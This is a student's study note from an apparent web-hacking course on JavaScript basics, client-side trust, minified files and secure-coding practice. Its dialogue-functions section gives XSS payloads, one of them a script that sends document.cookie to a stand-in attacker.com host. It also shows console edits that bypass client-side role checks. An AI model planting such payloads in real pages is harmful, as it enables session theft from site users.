# JavaScript Essentials
**Path:** CyberSec_101 - Web Hacking
**Date:** 2026-03-14
**Difficulty:** Easy

---

## Commands Used

- `curl -s https://site.com/app.js` → Download JS file from terminal
- `cat app.js | python3 -m json.tool` → Pretty print JS/JSON file

---

## Essential Concepts

- JavaScript is a client side scripting language
- Runs inside the browser — not on the server
- Used to add interactivity to web pages
- Can read/write cookies, manipulate DOM, make HTTP requests
- Variables:
  - `var` → old way, function scoped
  - `let` → block scoped, preferred
  - `const` → block scoped, value cannot change
- Data types: string, number, boolean, array, object, null, undefined
- Functions:
```javascript
function greet(name) {
    return "Hello " + name;
}
// Arrow function (modern)
const greet = (name) => "Hello " + name;
```

---

## JavaScript Overview

- JS runs in browser console — press F12 → Console tab
- Can be tested directly in browser without any setup
- Interpreted language — no compilation needed
- Weakly typed — variables can change type
- Objects store key value pairs:
```javascript
let user = {
    name: "rahul",
    age: 20,
    role: "admin"
};
console.log(user.role); // admin
```
- Arrays store lists:
```javascript
let tools = ["nmap", "burpsuite", "metasploit"];
console.log(tools[0]); // nmap
```

---

## Integrating JavaScript in HTML

Three ways JS can be included in a webpage:

1. Inline → directly inside HTML tag (bad practice)
```html
<button onclick="alert('clicked')">Click me</button>
```

2. Internal → inside script tag in HTML file
```html
<script>
    alert("Hello");
</script>
```

3. External → separate .js file linked in HTML
```html
<script src="/static/app.js"></script>
```

Security relevance:
- External JS files are a recon target — always check them
- Source maps (.js.map) can expose original unminified code
- Check page source and F12 Sources tab for hidden JS files

---

## Abusing Dialogue Functions

Three built in JS functions that pop up in browser:

- `alert("message")` → shows a popup (no input)
- `prompt("message")` → asks user for input, returns value
- `confirm("message")` → yes/no dialog, returns true/false

Security relevance — these are used to prove XSS:
```javascript
// Classic XSS proof of concept payload
<script>alert(1)</script>

// Cookie stealing via XSS
<script>alert(document.cookie)</script>

// Redirect victim to attacker site
<script>window.location="https://attacker.com?c="+document.cookie</script>
```
- If alert(1) fires on a site → XSS vulnerability confirmed
- prompt() and confirm() can be abused to trick users
- These functions are blocked in some modern browsers inside iframes

---

## Bypassing Control Flow Statements

Control flow = if/else/switch logic that controls access
```javascript
// Example login check
if (username === "admin" && password === "secret") {
    grantAccess();
} else {
    denyAccess();
}
```

How attackers abuse this:
- Modify JS in browser DevTools to bypass checks
- Change condition from true to false or vice versa
- Intercept and modify responses in Burp Suite
- Common bypass → changing role check:
```javascript
// Original
if (user.role === "admin") { showAdminPanel(); }

// Attacker modifies in console
user.role = "admin";  // overrides the check
```

Switch statement bypass:
```javascript
switch(userRole) {
    case "admin": // attacker targets this case
        showSecrets();
        break;
    case "guest":
        showBasic();
        break;
}
```

Key point — never trust client side validation.
Any check done in JS can be bypassed by the user.
All security checks must be done server side.

---

## Exploring Minified Files

Minification = removing whitespace, renaming variables
to make JS files smaller and faster to load

Minified JS looks like this:
```javascript
function a(b,c){return b+c}var x=a(1,2);
```

Why it matters for hackers:
- Minified files hide API keys, endpoints, logic
- Developers sometimes leave sensitive data in JS files
- Source maps (.js.map) can expose original readable code

Tools to deobfuscate minified JS:
- **beautifier.io** → paste minified JS, get readable version
- **Browser DevTools** → F12 → Sources → click {} button
- **js-beautify** → command line tool
```bash
npm install -g js-beautify
js-beautify app.min.js
```

What to look for in JS files during recon:
- API endpoints → `/api/v1/admin/users`
- Hardcoded credentials → `password: "admin123"`
- Secret keys → `apiKey: "sk_live_abc123"`
- Hidden parameters → `?debug=true&admin=1`
- Internal URLs → `https://internal.company.com`

---

## Best Practices (What Devs Should Do = What to Look For)

- Never store secrets in client side JS
- Never trust client side input validation
- Always validate on server side
- Use HttpOnly cookies to prevent JS cookie access
- Avoid using eval() → executes arbitrary JS strings
- Use Content Security Policy to restrict script sources
- Subresource Integrity (SRI) → verify external JS files
  not tampered with:
```html
<script src="app.js" integrity="sha384-abc123..."></script>
```

As a hacker — when devs ignore these → vulnerabilities:
- Secrets in JS → information disclosure
- Client side validation only → bypass and privilege escalation
- No CSP → XSS attacks easier to execute
- eval() usage → potential code injection

---

## Gotchas / Surprises

- JS runs in browser so user has full control over it
- F12 console lets anyone run JS on any page they visit
- Minified files are NOT security — they can be reversed
- Source maps accidentally deployed = full source code leak
- eval() is extremely dangerous and often leads to XSS
- Client side role checks are useless — always bypassable

---

## My Understanding in Plain English

JavaScript runs in the browser which means the user
controls it. Any security check done in JS can be
bypassed. Minified files can be deobfuscated to find
hidden endpoints and secrets. The dialogue functions
like alert() are how XSS attacks are proven.
Never trust anything that runs on the client side.

---

## Related Notes

- [[Web Application Basics]]
- [[XSS]]
- [[Burp Suite]]
- [[CSRF]]
